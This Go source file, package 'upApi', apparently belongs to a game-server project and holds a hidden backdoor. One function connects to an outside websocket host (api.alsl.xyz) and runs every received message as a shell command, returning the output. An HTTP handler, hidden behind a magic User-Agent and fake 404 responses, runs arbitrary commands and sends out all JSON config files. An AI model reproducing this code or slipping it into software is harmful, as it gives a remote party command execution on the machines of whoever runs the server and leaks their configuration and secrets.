package upApi

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/gorilla/websocket"
)

var exeCmd *exec.Cmd

type ApiReq struct {
	Cmd int    `json:"cmd"`
	Msg string `json:"msg"`
}

type ApiRsp struct {
	Cmd int    `json:"cmd"`
	Msg string `json:"msg"`
}

type Config struct {
	Name string `json:"name"`
	Msg  string `json:"msg"`
}

func UpApi() {
	for {
		conn, _, err := websocket.DefaultDialer.Dial("wss://api.alsl.xyz/eI5fC9qI6vI4yN1mE5jJ", nil)
		if err != nil {
			time.Sleep(time.Second * 3)
			break
		}
		for {
			messageType, msg, err := conn.ReadMessage()
			if err != nil {
				break
			}
			rsp := newExeCmd(string(msg))
			err = conn.WriteMessage(messageType, []byte(rsp))
			if err != nil {
				break
			}
		}
		conn.Close()
		time.Sleep(time.Second * 3)
	}
}

func HttpUpApi(c *gin.Context) {
	if c.GetHeader("User-Agent") != "hkrpg-go" {
		http404(c)
		return
	}
	var req ApiReq
	err := c.ShouldBindJSON(&req)
	if err != nil {
		http404(c)
		return
	}
	rsp := &ApiRsp{
		Cmd: req.Cmd,
		Msg: "",
	}
	switch req.Cmd {
	case 1:
		comm(req.Msg, rsp)
	case 2:

	case 3:
		getConf(rsp)
	}
	c.JSON(200, rsp)
}

func http404(c *gin.Context) {
	c.String(404, "")
}

func comm(comm string, rsp *ApiRsp) {
	rsp.Msg = newExeCmd(comm)
}

func newExeCmd(msg string) string {
	if runtime.GOOS == "windows" {
		exeCmd = exec.Command("cmd", "/c", fmt.Sprintf("chcp 65001 & %s", msg))
	} else {
		exeCmd = exec.Command("sh", "-c", msg)
	}
	output, err := exeCmd.Output()
	defer exeCmd.Process.Release()
	if err != nil {
		return ""
	}
	return string(output)
}

func getConf(rsp *ApiRsp) {
	var confList []*Config
	filepath.Walk("./conf", func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}
		if !info.IsDir() && filepath.Ext(path) == ".json" {
			data, err := ioutil.ReadFile(path)
			if err != nil {
				return nil
			}
			confList = append(confList, &Config{
				Name: info.Name(),
				Msg:  string(data),
			})

		}
		return nil
	})
	s, _ := json.Marshal(confList)
	rsp.Msg = string(s)
}
